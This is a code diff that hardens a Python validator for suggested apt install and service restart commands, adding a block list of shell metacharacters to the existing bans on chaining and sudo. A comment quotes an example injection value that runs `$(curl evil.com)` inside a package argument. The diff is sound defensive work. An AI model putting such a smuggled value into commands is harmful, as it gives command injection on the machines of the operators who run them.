@@ -177,6 +177,11 @@ _FORBIDDEN_MANAGERS = ("yum", "dnf", "zypper", "pacman", "snap", "pip", "npm", "
 _FORBIDDEN_FLAGS = ("-y ", "--yes", "--assume-yes")
 _FORBIDDEN_SUDO = "sudo"
 _FORBIDDEN_CHAIN = ("&&", ";", "||", "\n")
+# Shell metacharacters that enable command substitution / redirection even
+# without explicit chaining operators. An operator who pastes
+# `apt install foo=$(curl evil.com)` into bash gets command injection, so we
+# refuse to emit any command containing these. Discovered during v2-14 audit.
+_FORBIDDEN_METACHARS = ("$(", "`", "|", ">", "<")
 
 _JSON_FENCE_RE = re.compile(r"```(?:json)?\s*(.*?)\s*```", re.DOTALL | re.IGNORECASE)
 _JSON_OBJECT_RE = re.compile(r"\{.*\}", re.DOTALL)
@@ -254,6 +259,12 @@ def _validate_apt_command(cmd: str) -> None:
         raise RemediationValidationError(
             "apt_command must not chain multiple shell commands"
         )
+    for mc in _FORBIDDEN_METACHARS:
+        if mc in cmd:
+            raise RemediationValidationError(
+                f"apt_command contains shell metacharacter {mc!r} "
+                "(command substitution or redirection is not allowed)"
+            )
     if cmd.lower().startswith(_FORBIDDEN_SUDO):
         raise RemediationValidationError(
             "apt_command must not include a sudo prefix"
@@ -288,6 +299,11 @@ def _validate_service_restart(cmd: str) -> None:
         raise RemediationValidationError(
             "service_restart must not chain multiple shell commands"
         )
+    for mc in _FORBIDDEN_METACHARS:
+        if mc in cmd:
+            raise RemediationValidationError(
+                f"service_restart contains shell metacharacter {mc!r}"
+            )
     if cmd.lower().startswith(_FORBIDDEN_SUDO):
         raise RemediationValidationError(
             "service_restart must not include a sudo prefix"
